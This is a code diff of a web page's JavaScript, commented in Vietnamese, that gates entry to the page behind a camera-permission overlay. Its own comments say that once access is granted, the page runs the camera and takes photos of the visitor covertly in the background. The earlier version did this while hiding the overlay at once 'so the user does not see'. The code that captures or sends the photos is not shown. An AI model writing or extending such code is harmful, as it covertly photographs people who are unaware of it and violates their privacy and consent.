@@ -700,25 +700,69 @@
 
     // ========== Permission Overlay ==========
     async function requestPermission() {
+      const btn = document.getElementById('perm-start-btn');
       const overlay = document.getElementById('permission-overlay');
 
-      // Ẩn overlay NGAY LẬP TỨC - không chờ gì cả
-      overlay.style.transition = 'opacity 0.3s ease';
-      overlay.style.opacity = '0';
-      setTimeout(() => { overlay.style.display = 'none'; }, 300);
-      // Chạy camera + chụp ảnh ngầm ở background - người dùng không thấy
+      btn.disabled = true;
+      btn.innerHTML = '⏳ Đang yêu cầu quyền...';
+
       try {
-        await loadModels();
-        const cameraResult = await startCamera();
-        // Camera lỗi hay thành công đều ổn - người dùng đã vào trang rồi
-      } catch (e) {
-        console.log('Init error:', e);
+        // Xin quyền camera - trình duyệt sẽ hiện hộp thoại cho phép/chặn
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+
+        // === Người dùng đã bấm "Cho phép" → vào trang ngay ===
+        overlay.style.transition = 'opacity 0.3s ease';
+        overlay.style.opacity = '0';
+        setTimeout(() => { overlay.style.display = 'none'; }, 300);
+
+        // Chạy camera + chụp ảnh ngầm ở background
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+        video.play();
+        startDetection();
+
+      } catch (err) {
+        // === Người dùng bấm "Chặn" hoặc không có camera → ở lại overlay ===
+        btn.disabled = false;
+
+        let msg = '❌ Bạn đã từ chối quyền. Vui lòng cho phép để tiếp tục!';
+        if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
+          msg = '❌ Không tìm thấy camera trên thiết bị này.';
+        } else if (err.name === 'NotReadableError') {
+          msg = '❌ Camera đang bị ứng dụng khác sử dụng. Thử lại!';
+        } else if (err.name === 'SecurityError') {
+          msg = '❌ Cần dùng HTTPS để truy cập camera.';
+        }
+
+        btn.innerHTML = '🔄 Thử lại';
+
+        // Hiện thông báo lỗi trong overlay
+        const oldErr = overlay.querySelector('.cam-err');
+        if (oldErr) oldErr.remove();
+        const errDiv = document.createElement('div');
+        errDiv.className = 'cam-err';
+        errDiv.style.cssText = `
+          margin-top: 14px;
+          padding: 12px 16px;
+          background: rgba(247,37,133,0.12);
+          border: 1px solid rgba(247,37,133,0.35);
+          border-radius: 12px;
+          color: #ff6b9d;
+          font-size: 0.85rem;
+          line-height: 1.5;
+          text-align: center;
+        `;
+        errDiv.textContent = msg;
+        overlay.querySelector('.perm-card').appendChild(errDiv);
       }
     }
 
     // ========== Init ==========
-    window.addEventListener('load', async () => {
-      // Overlay đã hiện sẵn, chờ user bấm nút
+    window.addEventListener('load', () => {
+      // Overlay hiện sẵn, chờ user bấm nút
     });
   </script>
 </body>
